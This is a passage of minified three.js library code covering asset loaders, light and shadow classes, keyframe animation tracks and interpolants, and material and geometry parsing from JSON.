ArrayBuffer(g.length);for(var p=new Uint8Array(k),m=0;m<g.length;m++)p[m]=g.charCodeAt(m);\n\"blob\"===l&&(k=new Blob([k],{type:h}));break;case \"document\":k=(new DOMParser).parseFromString(g,h);break;case \"json\":k=JSON.parse(g);break;default:k=g}window.setTimeout(function(){b&&b(k);e.manager.itemEnd(a)},0)}catch(q){window.setTimeout(function(){d&&d(q);e.manager.itemError(a)},0)}}else{var n=new XMLHttpRequest;n.open(\"GET\",a,!0);n.addEventListener(\"load\",function(c){var f=c.target.response;ld.add(a,f);200===this.status?(b&&b(f),e.manager.itemEnd(a)):0===this.status?(console.warn(\"THREE.FileLoader: HTTP Status 0 received.\"),\nb&&b(f),e.manager.itemEnd(a)):(d&&d(c),e.manager.itemError(a))},!1);void 0!==c&&n.addEventListener(\"progress\",function(a){c(a)},!1);n.addEventListener(\"error\",function(b){d&&d(b);e.manager.itemError(a)},!1);void 0!==this.responseType&&(n.responseType=this.responseType);void 0!==this.withCredentials&&(n.withCredentials=this.withCredentials);n.overrideMimeType&&n.overrideMimeType(void 0!==this.mimeType?this.mimeType:\"text/plain\");n.send(null)}e.manager.itemStart(a);return n},setPath:function(a){this.path=\na;return this},setResponseType:function(a){this.responseType=a;return this},setWithCredentials:function(a){this.withCredentials=a;return this},setMimeType:function(a){this.mimeType=a;return this}});Object.assign(Re.prototype,{load:function(a,b,c,d){function e(e){m.load(a[e],function(a){a=f._parser(a,!0);g[e]={width:a.width,height:a.height,format:a.format,mipmaps:a.mipmaps};k+=1;6===k&&(1===a.mipmapCount&&(h.minFilter=1006),h.format=a.format,h.needsUpdate=!0,b&&b(h))},c,d)}var f=this,g=[],h=new Nb;\nh.image=g;var m=new sa(this.manager);m.setPath(this.path);m.setResponseType(\"arraybuffer\");if(Array.isArray(a))for(var k=0,l=0,p=a.length;l<p;++l)e(l);else m.load(a,function(a){a=f._parser(a,!0);if(a.isCubemap)for(var c=a.mipmaps.length/a.mipmapCount,d=0;d<c;d++){g[d]={mipmaps:[]};for(var e=0;e<a.mipmapCount;e++)g[d].mipmaps.push(a.mipmaps[d*a.mipmapCount+e]),g[d].format=a.format,g[d].width=a.width,g[d].height=a.height}else h.image.width=a.width,h.image.height=a.height,h.mipmaps=a.mipmaps;1===a.mipmapCount&&\n(h.minFilter=1006);h.format=a.format;h.needsUpdate=!0;b&&b(h)},c,d);return h},setPath:function(a){this.path=a;return this}});Object.assign(ae.prototype,{load:function(a,b,c,d){var e=this,f=new eb,g=new sa(this.manager);g.setResponseType(\"arraybuffer\");g.load(a,function(a){if(a=e._parser(a))void 0!==a.image?f.image=a.image:void 0!==a.data&&(f.image.width=a.width,f.image.height=a.height,f.image.data=a.data),f.wrapS=void 0!==a.wrapS?a.wrapS:1001,f.wrapT=void 0!==a.wrapT?a.wrapT:1001,f.magFilter=void 0!==\na.magFilter?a.magFilter:1006,f.minFilter=void 0!==a.minFilter?a.minFilter:1008,f.anisotropy=void 0!==a.anisotropy?a.anisotropy:1,void 0!==a.format&&(f.format=a.format),void 0!==a.type&&(f.type=a.type),void 0!==a.mipmaps&&(f.mipmaps=a.mipmaps),1===a.mipmapCount&&(f.minFilter=1006),f.needsUpdate=!0,b&&b(f,a)},c,d);return f}});Object.assign(Yc.prototype,{load:function(a,b,c,d){void 0===a&&(a=\"\");void 0!==this.path&&(a=this.path+a);var e=this,f=ld.get(a);if(void 0!==f)return e.manager.itemStart(a),setTimeout(function(){b&&\nb(f);e.manager.itemEnd(a)},0),f;c=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"img\");c.addEventListener(\"load\",function(){ld.add(a,this);b&&b(this);e.manager.itemEnd(a)},!1);c.addEventListener(\"error\",function(b){d&&d(b);e.manager.itemError(a)},!1);void 0!==this.crossOrigin&&(c.crossOrigin=this.crossOrigin);e.manager.itemStart(a);c.src=a;return c},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});Object.assign(be.prototype,{load:function(a,\nb,c,d){function e(c){g.load(a[c],function(a){f.images[c]=a;h++;6===h&&(f.needsUpdate=!0,b&&b(f))},void 0,d)}var f=new Za,g=new Yc(this.manager);g.setCrossOrigin(this.crossOrigin);g.setPath(this.path);var h=0;for(c=0;c<a.length;++c)e(c);return f},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});Object.assign(td.prototype,{load:function(a,b,c,d){var e=new ea,f=new Yc(this.manager);f.setCrossOrigin(this.crossOrigin);f.setPath(this.path);f.load(a,\nfunction(c){var d=0<a.search(/\\.(jpg|jpeg)$/)||0===a.search(/^data\\:image\\/jpeg/);e.format=d?1022:1023;e.image=c;e.needsUpdate=!0;void 0!==b&&b(e)},c,d);return e},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});ma.prototype=Object.assign(Object.create(x.prototype),{constructor:ma,isLight:!0,copy:function(a){x.prototype.copy.call(this,a);this.color.copy(a.color);this.intensity=a.intensity;return this},toJSON:function(a){a=x.prototype.toJSON.call(this,\na);a.object.color=this.color.getHex();a.object.intensity=this.intensity;void 0!==this.groundColor&&(a.object.groundColor=this.groundColor.getHex());void 0!==this.distance&&(a.object.distance=this.distance);void 0!==this.angle&&(a.object.angle=this.angle);void 0!==this.decay&&(a.object.decay=this.decay);void 0!==this.penumbra&&(a.object.penumbra=this.penumbra);void 0!==this.shadow&&(a.object.shadow=this.shadow.toJSON());return a}});ud.prototype=Object.assign(Object.create(ma.prototype),{constructor:ud,\nisHemisphereLight:!0,copy:function(a){ma.prototype.copy.call(this,a);this.groundColor.copy(a.groundColor);return this}});Object.assign(wb.prototype,{copy:function(a){this.camera=a.camera.clone();this.bias=a.bias;this.radius=a.radius;this.mapSize.copy(a.mapSize);return this},clone:function(){return(new this.constructor).copy(this)},toJSON:function(){var a={};0!==this.bias&&(a.bias=this.bias);1!==this.radius&&(a.radius=this.radius);if(512!==this.mapSize.x||512!==this.mapSize.y)a.mapSize=this.mapSize.toArray();\na.camera=this.camera.toJSON(!1).object;delete a.camera.matrix;return a}});vd.prototype=Object.assign(Object.create(wb.prototype),{constructor:vd,isSpotLightShadow:!0,update:function(a){var b=2*N.RAD2DEG*a.angle,c=this.mapSize.width/this.mapSize.height;a=a.distance||500;var d=this.camera;if(b!==d.fov||c!==d.aspect||a!==d.far)d.fov=b,d.aspect=c,d.far=a,d.updateProjectionMatrix()}});wd.prototype=Object.assign(Object.create(ma.prototype),{constructor:wd,isSpotLight:!0,copy:function(a){ma.prototype.copy.call(this,\na);this.distance=a.distance;this.angle=a.angle;this.penumbra=a.penumbra;this.decay=a.decay;this.target=a.target.clone();this.shadow=a.shadow.clone();return this}});xd.prototype=Object.assign(Object.create(ma.prototype),{constructor:xd,isPointLight:!0,copy:function(a){ma.prototype.copy.call(this,a);this.distance=a.distance;this.decay=a.decay;this.shadow=a.shadow.clone();return this}});yd.prototype=Object.assign(Object.create(wb.prototype),{constructor:yd});zd.prototype=Object.assign(Object.create(ma.prototype),\n{constructor:zd,isDirectionalLight:!0,copy:function(a){ma.prototype.copy.call(this,a);this.target=a.target.clone();this.shadow=a.shadow.clone();return this}});Ad.prototype=Object.assign(Object.create(ma.prototype),{constructor:Ad,isAmbientLight:!0});var na={arraySlice:function(a,b,c){return na.isTypedArray(a)?new a.constructor(a.subarray(b,c)):a.slice(b,c)},convertArray:function(a,b,c){return!a||!c&&a.constructor===b?a:\"number\"===typeof b.BYTES_PER_ELEMENT?new b(a):Array.prototype.slice.call(a)},\nisTypedArray:function(a){return ArrayBuffer.isView(a)&&!(a instanceof DataView)},getKeyframeOrder:function(a){for(var b=a.length,c=Array(b),d=0;d!==b;++d)c[d]=d;c.sort(function(b,c){return a[b]-a[c]});return c},sortedArray:function(a,b,c){for(var d=a.length,e=new a.constructor(d),f=0,g=0;g!==d;++f)for(var h=c[f]*b,m=0;m!==b;++m)e[g++]=a[h+m];return e},flattenJSON:function(a,b,c,d){for(var e=1,f=a[0];void 0!==f&&void 0===f[d];)f=a[e++];if(void 0!==f){var g=f[d];if(void 0!==g)if(Array.isArray(g)){do g=\nf[d],void 0!==g&&(b.push(f.time),c.push.apply(c,g)),f=a[e++];while(void 0!==f)}else if(void 0!==g.toArray){do g=f[d],void 0!==g&&(b.push(f.time),g.toArray(c,c.length)),f=a[e++];while(void 0!==f)}else{do g=f[d],void 0!==g&&(b.push(f.time),c.push(g)),f=a[e++];while(void 0!==f)}}}};xa.prototype={constructor:xa,evaluate:function(a){var b=this.parameterPositions,c=this._cachedIndex,d=b[c],e=b[c-1];a:{b:{c:{d:if(!(a<d)){for(var f=c+2;;){if(void 0===d){if(a<e)break d;this._cachedIndex=c=b.length;return this.afterEnd_(c-\n1,a,e)}if(c===f)break;e=d;d=b[++c];if(a<d)break b}d=b.length;break c}if(a>=e)break a;else{f=b[1];a<f&&(c=2,e=f);for(f=c-2;;){if(void 0===e)return this._cachedIndex=0,this.beforeStart_(0,a,d);if(c===f)break;d=e;e=b[--c-1];if(a>=e)break b}d=c;c=0}}for(;c<d;)e=c+d>>>1,a<b[e]?d=e:c=e+1;d=b[c];e=b[c-1];if(void 0===e)return this._cachedIndex=0,this.beforeStart_(0,a,d);if(void 0===d)return this._cachedIndex=c=b.length,this.afterEnd_(c-1,e,a)}this._cachedIndex=c;this.intervalChanged_(c,e,d)}return this.interpolate_(c,\ne,a,d)},settings:null,DefaultSettings_:{},getSettings_:function(){return this.settings||this.DefaultSettings_},copySampleValue_:function(a){var b=this.resultBuffer,c=this.sampleValues,d=this.valueSize;a*=d;for(var e=0;e!==d;++e)b[e]=c[a+e];return b},interpolate_:function(a,b,c,d){throw Error(\"call to abstract method\");},intervalChanged_:function(a,b,c){}};Object.assign(xa.prototype,{beforeStart_:xa.prototype.copySampleValue_,afterEnd_:xa.prototype.copySampleValue_});Bd.prototype=Object.assign(Object.create(xa.prototype),\n{constructor:Bd,DefaultSettings_:{endingStart:2400,endingEnd:2400},intervalChanged_:function(a,b,c){var d=this.parameterPositions,e=a-2,f=a+1,g=d[e],h=d[f];if(void 0===g)switch(this.getSettings_().endingStart){case 2401:e=a;g=2*b-c;break;case 2402:e=d.length-2;g=b+d[e]-d[e+1];break;default:e=a,g=c}if(void 0===h)switch(this.getSettings_().endingEnd){case 2401:f=a;h=2*c-b;break;case 2402:f=1;h=c+d[1]-d[0];break;default:f=a-1,h=b}a=.5*(c-b);d=this.valueSize;this._weightPrev=a/(b-g);this._weightNext=\na/(h-c);this._offsetPrev=e*d;this._offsetNext=f*d},interpolate_:function(a,b,c,d){var e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;var h=a-g,m=this._offsetPrev,k=this._offsetNext,l=this._weightPrev,p=this._weightNext,n=(c-b)/(d-b);c=n*n;d=c*n;b=-l*d+2*l*c-l*n;l=(1+l)*d+(-1.5-2*l)*c+(-.5+l)*n+1;n=(-1-p)*d+(1.5+p)*c+.5*n;p=p*d-p*c;for(c=0;c!==g;++c)e[c]=b*f[m+c]+l*f[h+c]+n*f[a+c]+p*f[k+c];return e}});Zc.prototype=Object.assign(Object.create(xa.prototype),{constructor:Zc,interpolate_:function(a,\nb,c,d){var e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;var h=a-g;b=(c-b)/(d-b);c=1-b;for(d=0;d!==g;++d)e[d]=f[h+d]*c+f[a+d]*b;return e}});Cd.prototype=Object.assign(Object.create(xa.prototype),{constructor:Cd,interpolate_:function(a,b,c,d){return this.copySampleValue_(a-1)}});var Xa;Xa={TimeBufferType:Float32Array,ValueBufferType:Float32Array,DefaultInterpolation:2301,InterpolantFactoryMethodDiscrete:function(a){return new Cd(this.times,this.values,this.getValueSize(),a)},InterpolantFactoryMethodLinear:function(a){return new Zc(this.times,\nthis.values,this.getValueSize(),a)},InterpolantFactoryMethodSmooth:function(a){return new Bd(this.times,this.values,this.getValueSize(),a)},setInterpolation:function(a){var b;switch(a){case 2300:b=this.InterpolantFactoryMethodDiscrete;break;case 2301:b=this.InterpolantFactoryMethodLinear;break;case 2302:b=this.InterpolantFactoryMethodSmooth}if(void 0===b){b=\"unsupported interpolation for \"+this.ValueTypeName+\" keyframe track named \"+this.name;if(void 0===this.createInterpolant)if(a!==this.DefaultInterpolation)this.setInterpolation(this.DefaultInterpolation);\nelse throw Error(b);console.warn(b)}else this.createInterpolant=b},getInterpolation:function(){switch(this.createInterpolant){case this.InterpolantFactoryMethodDiscrete:return 2300;case this.InterpolantFactoryMethodLinear:return 2301;case this.InterpolantFactoryMethodSmooth:return 2302}},getValueSize:function(){return this.values.length/this.times.length},shift:function(a){if(0!==a)for(var b=this.times,c=0,d=b.length;c!==d;++c)b[c]+=a;return this},scale:function(a){if(1!==a)for(var b=this.times,c=\n0,d=b.length;c!==d;++c)b[c]*=a;return this},trim:function(a,b){for(var c=this.times,d=c.length,e=0,f=d-1;e!==d&&c[e]<a;)++e;for(;-1!==f&&c[f]>b;)--f;++f;if(0!==e||f!==d)e>=f&&(f=Math.max(f,1),e=f-1),d=this.getValueSize(),this.times=na.arraySlice(c,e,f),this.values=na.arraySlice(this.values,e*d,f*d);return this},validate:function(){var a=!0,b=this.getValueSize();0!==b-Math.floor(b)&&(console.error(\"invalid value size in track\",this),a=!1);var c=this.times,b=this.values,d=c.length;0===d&&(console.error(\"track is empty\",\nthis),a=!1);for(var e=null,f=0;f!==d;f++){var g=c[f];if(\"number\"===typeof g&&isNaN(g)){console.error(\"time is not a valid number\",this,f,g);a=!1;break}if(null!==e&&e>g){console.error(\"out of order keys\",this,f,g,e);a=!1;break}e=g}if(void 0!==b&&na.isTypedArray(b))for(f=0,c=b.length;f!==c;++f)if(d=b[f],isNaN(d)){console.error(\"value is not a valid number\",this,f,d);a=!1;break}return a},optimize:function(){for(var a=this.times,b=this.values,c=this.getValueSize(),d=2302===this.getInterpolation(),e=1,\nf=a.length-1,g=1;g<f;++g){var h=!1,m=a[g];if(m!==a[g+1]&&(1!==g||m!==m[0]))if(d)h=!0;else for(var k=g*c,l=k-c,p=k+c,m=0;m!==c;++m){var n=b[k+m];if(n!==b[l+m]||n!==b[p+m]){h=!0;break}}if(h){if(g!==e)for(a[e]=a[g],h=g*c,k=e*c,m=0;m!==c;++m)b[k+m]=b[h+m];++e}}if(0<f){a[e]=a[f];h=f*c;k=e*c;for(m=0;m!==c;++m)b[k+m]=b[h+m];++e}e!==a.length&&(this.times=na.arraySlice(a,0,e),this.values=na.arraySlice(b,0,e*c));return this}};dc.prototype=Object.assign(Object.create(Xa),{constructor:dc,ValueTypeName:\"vector\"});\nDd.prototype=Object.assign(Object.create(xa.prototype),{constructor:Dd,interpolate_:function(a,b,c,d){var e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;b=(c-b)/(d-b);for(c=a+g;a!==c;a+=4)ca.slerpFlat(e,0,f,a-g,f,a,b);return e}});$c.prototype=Object.assign(Object.create(Xa),{constructor:$c,ValueTypeName:\"quaternion\",DefaultInterpolation:2301,InterpolantFactoryMethodLinear:function(a){return new Dd(this.times,this.values,this.getValueSize(),a)},InterpolantFactoryMethodSmooth:void 0});\nec.prototype=Object.assign(Object.create(Xa),{constructor:ec,ValueTypeName:\"number\"});Ed.prototype=Object.assign(Object.create(Xa),{constructor:Ed,ValueTypeName:\"string\",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0});Fd.prototype=Object.assign(Object.create(Xa),{constructor:Fd,ValueTypeName:\"bool\",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0});\nGd.prototype=Object.assign(Object.create(Xa),{constructor:Gd,ValueTypeName:\"color\"});yb.prototype=Xa;Xa.constructor=yb;Object.assign(yb,{parse:function(a){if(void 0===a.type)throw Error(\"track type undefined, can not parse\");var b=yb._getTrackTypeForValueTypeName(a.type);if(void 0===a.times){var c=[],d=[];na.flattenJSON(a.keys,c,d,\"value\");a.times=c;a.values=d}return void 0!==b.parse?b.parse(a):new b(a.name,a.times,a.values,a.interpolation)},toJSON:function(a){var b=a.constructor;if(void 0!==b.toJSON)b=\nb.toJSON(a);else{var b={name:a.name,times:na.convertArray(a.times,Array),values:na.convertArray(a.values,Array)},c=a.getInterpolation();c!==a.DefaultInterpolation&&(b.interpolation=c)}b.type=a.ValueTypeName;return b},_getTrackTypeForValueTypeName:function(a){switch(a.toLowerCase()){case \"scalar\":case \"double\":case \"float\":case \"number\":case \"integer\":return ec;case \"vector\":case \"vector2\":case \"vector3\":case \"vector4\":return dc;case \"color\":return Gd;case \"quaternion\":return $c;case \"bool\":case \"boolean\":return Fd;\ncase \"string\":return Ed}throw Error(\"Unsupported typeName: \"+a);}});qa.prototype={constructor:qa,resetDuration:function(){for(var a=0,b=0,c=this.tracks.length;b!==c;++b)var d=this.tracks[b],a=Math.max(a,d.times[d.times.length-1]);this.duration=a},trim:function(){for(var a=0;a<this.tracks.length;a++)this.tracks[a].trim(0,this.duration);return this},optimize:function(){for(var a=0;a<this.tracks.length;a++)this.tracks[a].optimize();return this}};Object.assign(qa,{parse:function(a){for(var b=[],c=a.tracks,\nd=1/(a.fps||1),e=0,f=c.length;e!==f;++e)b.push(yb.parse(c[e]).scale(d));return new qa(a.name,a.duration,b)},toJSON:function(a){var b=[],c=a.tracks;a={name:a.name,duration:a.duration,tracks:b};for(var d=0,e=c.length;d!==e;++d)b.push(yb.toJSON(c[d]));return a},CreateFromMorphTargetSequence:function(a,b,c,d){for(var e=b.length,f=[],g=0;g<e;g++){var h=[],m=[];h.push((g+e-1)%e,g,(g+1)%e);m.push(0,1,0);var k=na.getKeyframeOrder(h),h=na.sortedArray(h,1,k),m=na.sortedArray(m,1,k);d||0!==h[0]||(h.push(e),\nm.push(m[0]));f.push((new ec(\".morphTargetInfluences[\"+b[g].name+\"]\",h,m)).scale(1/c))}return new qa(a,-1,f)},findByName:function(a,b){var c=a;Array.isArray(a)||(c=a.geometry&&a.geometry.animations||a.animations);for(var d=0;d<c.length;d++)if(c[d].name===b)return c[d];return null},CreateClipsFromMorphTargetSequences:function(a,b,c){for(var d={},e=/^([\\w-]*?)([\\d]+)$/,f=0,g=a.length;f<g;f++){var h=a[f],m=h.name.match(e);if(m&&1<m.length){var k=m[1];(m=d[k])||(d[k]=m=[]);m.push(h)}}a=[];for(k in d)a.push(qa.CreateFromMorphTargetSequence(k,\nd[k],b,c));return a},parseAnimation:function(a,b){if(!a)return console.error(\"  no animation in JSONLoader data\"),null;for(var c=function(a,b,c,d,e){if(0!==c.length){var f=[],g=[];na.flattenJSON(c,f,g,d);0!==f.length&&e.push(new a(b,f,g))}},d=[],e=a.name||\"default\",f=a.length||-1,g=a.fps||30,h=a.hierarchy||[],m=0;m<h.length;m++){var k=h[m].keys;if(k&&0!==k.length)if(k[0].morphTargets){for(var f={},l=0;l<k.length;l++)if(k[l].morphTargets)for(var p=0;p<k[l].morphTargets.length;p++)f[k[l].morphTargets[p]]=\n-1;for(var n in f){for(var q=[],G=[],p=0;p!==k[l].morphTargets.length;++p){var r=k[l];q.push(r.time);G.push(r.morphTarget===n?1:0)}d.push(new ec(\".morphTargetInfluence[\"+n+\"]\",q,G))}f=f.length*(g||1)}else l=\".bones[\"+b[m].name+\"]\",c(dc,l+\".position\",k,\"pos\",d),c($c,l+\".quaternion\",k,\"rot\",d),c(dc,l+\".scale\",k,\"scl\",d)}return 0===d.length?null:new qa(e,f,d)}});Object.assign(Hd.prototype,{load:function(a,b,c,d){var e=this;(new sa(e.manager)).load(a,function(a){b(e.parse(JSON.parse(a)))},c,d)},setTextures:function(a){this.textures=\na},parse:function(a){function b(a){void 0===c[a]&&console.warn(\"THREE.MaterialLoader: Undefined texture\",a);return c[a]}var c=this.textures,d=new Xf[a.type];void 0!==a.uuid&&(d.uuid=a.uuid);void 0!==a.name&&(d.name=a.name);void 0!==a.color&&d.color.setHex(a.color);void 0!==a.roughness&&(d.roughness=a.roughness);void 0!==a.metalness&&(d.metalness=a.metalness);void 0!==a.emissive&&d.emissive.setHex(a.emissive);void 0!==a.specular&&d.specular.setHex(a.specular);void 0!==a.shininess&&(d.shininess=a.shininess);\nvoid 0!==a.clearCoat&&(d.clearCoat=a.clearCoat);void 0!==a.clearCoatRoughness&&(d.clearCoatRoughness=a.clearCoatRoughness);void 0!==a.uniforms&&(d.uniforms=a.uniforms);void 0!==a.vertexShader&&(d.vertexShader=a.vertexShader);void 0!==a.fragmentShader&&(d.fragmentShader=a.fragmentShader);void 0!==a.vertexColors&&(d.vertexColors=a.vertexColors);void 0!==a.fog&&(d.fog=a.fog);void 0!==a.shading&&(d.shading=a.shading);void 0!==a.blending&&(d.blending=a.blending);void 0!==a.side&&(d.side=a.side);void 0!==\na.opacity&&(d.opacity=a.opacity);void 0!==a.transparent&&(d.transparent=a.transparent);void 0!==a.alphaTest&&(d.alphaTest=a.alphaTest);void 0!==a.depthTest&&(d.depthTest=a.depthTest);void 0!==a.depthWrite&&(d.depthWrite=a.depthWrite);void 0!==a.colorWrite&&(d.colorWrite=a.colorWrite);void 0!==a.wireframe&&(d.wireframe=a.wireframe);void 0!==a.wireframeLinewidth&&(d.wireframeLinewidth=a.wireframeLinewidth);void 0!==a.wireframeLinecap&&(d.wireframeLinecap=a.wireframeLinecap);void 0!==a.wireframeLinejoin&&\n(d.wireframeLinejoin=a.wireframeLinejoin);void 0!==a.skinning&&(d.skinning=a.skinning);void 0!==a.morphTargets&&(d.morphTargets=a.morphTargets);void 0!==a.size&&(d.size=a.size);void 0!==a.sizeAttenuation&&(d.sizeAttenuation=a.sizeAttenuation);void 0!==a.map&&(d.map=b(a.map));void 0!==a.alphaMap&&(d.alphaMap=b(a.alphaMap),d.transparent=!0);void 0!==a.bumpMap&&(d.bumpMap=b(a.bumpMap));void 0!==a.bumpScale&&(d.bumpScale=a.bumpScale);void 0!==a.normalMap&&(d.normalMap=b(a.normalMap));if(void 0!==a.normalScale){var e=\na.normalScale;!1===Array.isArray(e)&&(e=[e,e]);d.normalScale=(new D).fromArray(e)}void 0!==a.displacementMap&&(d.displacementMap=b(a.displacementMap));void 0!==a.displacementScale&&(d.displacementScale=a.displacementScale);void 0!==a.displacementBias&&(d.displacementBias=a.displacementBias);void 0!==a.roughnessMap&&(d.roughnessMap=b(a.roughnessMap));void 0!==a.metalnessMap&&(d.metalnessMap=b(a.metalnessMap));void 0!==a.emissiveMap&&(d.emissiveMap=b(a.emissiveMap));void 0!==a.emissiveIntensity&&(d.emissiveIntensity=\na.emissiveIntensity);void 0!==a.specularMap&&(d.specularMap=b(a.specularMap));void 0!==a.envMap&&(d.envMap=b(a.envMap));void 0!==a.reflectivity&&(d.reflectivity=a.reflectivity);void 0!==a.lightMap&&(d.lightMap=b(a.lightMap));void 0!==a.lightMapIntensity&&(d.lightMapIntensity=a.lightMapIntensity);void 0!==a.aoMap&&(d.aoMap=b(a.aoMap));void 0!==a.aoMapIntensity&&(d.aoMapIntensity=a.aoMapIntensity);void 0!==a.gradientMap&&(d.gradientMap=b(a.gradientMap));if(void 0!==a.materials)for(var e=0,f=a.materials.length;e<\nf;e++)d.materials.push(this.parse(a.materials[e]));return d}});Object.assign(ce.prototype,{load:function(a,b,c,d){var e=this;(new sa(e.manager)).load(a,function(a){b(e.parse(JSON.parse(a)))},c,d)},parse:function(a){var b=new I,c=a.data.index,d={Int8Array:Int8Array,Uint8Array:Uint8Array,Uint8ClampedArray:Uint8ClampedArray,Int16Array:Int16Array,Uint16Array:Uint16Array,Int32Array:Int32Array,Uint32Array:Uint32Array,Float32Array:Float32Array,Float64Array:Float64Array};void 0!==c&&(c=new d[c.type](c.array),\nb.setIndex(new U(c,1)));var e=a.data.attributes,f;for(f in e){var g=e[f],c=new d[g.type](g.array);b.addAttribute(f,new U(c,g.itemSize,g.normalized))}d=a.data.groups||a.data.drawcalls||a.data.offsets;if(void 0!==d)for(f=0,c=d.length;f!==c;++f)e=d[f],b.addGroup(e.start,e.count,e.materialIndex);a=a.data.boundingSphere;void 0!==a&&(d=new q,void 0!==a.center&&d.fromArray(a.center),b.boundingSphere=new Na(d,a.radius));return b}});zb.prototype={constructor:zb,crossOrigin:void 0,extractUrlBase:function(a){a=\na.split(\"/\");if(1===a.length)return\"./\";a.pop();return a.join(\"/\")+\"/\"},initMaterials:function(a,b,c){for(var d=[],e=0;e<a.length;++e)d[e]=this.createMaterial(a[e],b,c);return d},createMaterial:function(){var a={NoBlending:0,NormalBlending:1,AdditiveBlending:2,SubtractiveBlending:3,MultiplyBlending:4,CustomBlending:5},b,c,d;return function(e,f,g){function h(a,b,d,e,h){a=f+a;var k=zb.Handlers.get(a);null!==k?a=k.load(a):(c.setCrossOrigin(g),a=c.load(a));void 0!==b&&(a.repeat.fromArray(b),1!==b[0]&&\n(a.wrapS=1E3),1!==b[1]&&(a.wrapT=1E3));void 0!==d&&a.offset.fromArray(d);void 0!==e&&(\"repeat\"===e[0]&&(a.wrapS=1E3),\"mirror\"===e[0]&&(a.wrapS=1002),\"repeat\"===e[1]&&(a.wrapT=1E3),\"mirror\"===e[1]&&(a.wrapT=1002));void 0!==h&&(a.anisotropy=h);b=N.generateUUID();m[b]=a;return b}void 0===b&&(b=new J);void 0===c&&(c=new td);void 0===d&&(d=new Hd);var m={},k={uuid:N.generateUUID(),type:\"MeshLambertMaterial\"},l;for(l in e){var p=e[l];switch(l){case \"DbgColor\":case \"DbgIndex\":case \"opticalDensity\":case \"illumination\":break;\ncase \"DbgName\":k.name=p;break;case \"blending\":k.blending=a[p];break;case \"colorAmbient\":case \"mapAmbient\":console.warn(\"THREE.Loader.createMaterial:\",l,\"is no longer supported.\");break;case \"colorDiffuse\":k.color=b.fromArray(p).getHex();break;case \"colorSpecular\":k.specular=b.fromArray(p).getHex();break;case \"colorEmissive\":k.emissive=b.fromArray(p).getHex();break;case \"specularCoef\":k.shininess=p;break;case \"shading\":\"basic\"===p.toLowerCase()&&(k.type=\"MeshBasicMaterial\");\"phong\"===p.toLowerCase()&&\n(k.type=\"MeshPhongMaterial\");\"standard\"===p.toLowerCase()&&(k.type=\"MeshStandardMaterial\");break;case \"mapDiffuse\":k.map=h(p,e.mapDiffuseRepeat,e.mapDiffuseOffset,e.mapDiffuseWrap,e.mapDiffuseAnisotropy);break;case \"mapDiffuseRepeat\":case \"mapDiffuseOffset\":case \"mapDiffuseWrap\":case \"mapDiffuseAnisotropy\":break;case \"mapEmissive\":k.emissiveMap=h(p,e.mapEmissiveRepeat,e.mapEmissiveOffset,e.mapEmissiveWrap,e.mapEmissiveAnisotropy);break;case \"mapEmissiveRepeat\":case \"mapEmissiveOffset\":case \"mapEmissiveWrap\":case \"mapEmissiveAnisotropy\":break;\ncase \"mapLight\":k.lightMap=h(p,e.mapLightRepeat,e.mapLightOffset,e.mapLightWrap,e.mapLightAnisotropy);break;case \"mapLightRepeat\":case \"mapLightOffset\":case \"mapLightWrap\":case \"mapLightAnisotropy\":break;case \"mapAO\":k.aoMap=h(p,e.mapAORepeat,e.mapAOOffset,e.mapAOWrap,e.mapAOAnisotropy);break;case \"mapAORepeat\":case \"mapAOOffset\":case \"mapAOWrap\":case \"mapAOAnisotropy\":break;case \"mapBump\":k.bumpMap=h(p,e.mapBumpRepeat,e.mapBumpOffset,e.mapBumpWrap,e.mapBumpAnisotropy);break;case \"mapBumpScale\":k.bumpScale=\np;break;case \"mapBumpRepeat\":case \"mapBumpOffset\":case \"mapBumpWrap\":case \"mapBumpAnisotropy\":break;case \"mapNormal\":k.normalMap=h(p,e.mapNormalRepeat,e.mapNormalOffset,e.mapNormalWrap,e.mapNormalAnisotropy);break;case \"mapNormalFactor\":k.normalScale=[p,p];break;case \"mapNormalRepeat\":case \"mapNormalOffset\":case \"mapNormalWrap\":case \"mapNormalAnisotropy\":break;case \"mapSpecular\":k.specularMap=h(p,e.mapSpecularRepeat,e.mapSpecularOffset,e.mapSpecularWrap,e.mapSpecularAnisotropy);break;case \"mapSpecularRepeat\":case \"mapSpecularOffset\":case \"mapSpecularWrap\":case \"mapSpecularAnisotropy\":break;\ncase \"mapMetalness\":k.metalnessMap=h(p,e.mapMetalnessRepeat,e.mapMetalnessOffset,e.mapMetalnessWrap,e.mapMetalnessAnisotropy);break;case \"mapMetalnessRepeat\":case \"mapMetalnessOffset\":case \"mapMetalnessWrap\":case \"mapMetalnessAnisotropy\":break;case \"mapRoughness\":k.roughnessMap=h(p,e.mapRoughnessRepeat,e.mapRoughnessOffset,e.mapRoughnessWrap,e.mapRoughnessAnisotropy);break;case \"mapRoughnessRepeat\":case \"mapRoughnessOffset\":case \"mapRoughnessWrap\":case \"mapRoughnessAnisotropy\":break;case \"mapAlpha\":k.alphaMap=\nh(p,e.mapAlphaRepeat,e.mapAlphaOffset,e.mapAlphaWrap,e.mapAlphaAnisotropy);break;case \"mapAlphaRepeat\":case \"mapAlphaOffset\":case \"mapAlphaWrap\":case \"mapAlphaAnisotropy\":break;case \"flipSided\":k.side=1;break;case \"doubleSided\":k.side=2;break;case \"transparency\":console.warn(\"THREE.Loader.createMaterial: transparency has been renamed to opacity\");k.opacity=p;break;case \"depthTest\":case \"depthWrite\":case \"colorWrite\":case \"opacity\":case \"reflectivity\":case \"transparent\":case \"visible\":case \"wireframe\":k[l]=\np;break;case \"vertexColors\":!0===p&&(k.vertexColors=2);\"face\"===p&&(k.vertexColors=1);break;default:console.error(\"THREE.Loader.createMaterial: Unsupported\",l,p)}}\"MeshBasicMaterial\"===k.type&&delete k.emissive;\"MeshPhongMaterial\"!==k.type&&delete k.specular;1>k.opacity&&(k.transparent=!0);d.setTextures(m);return 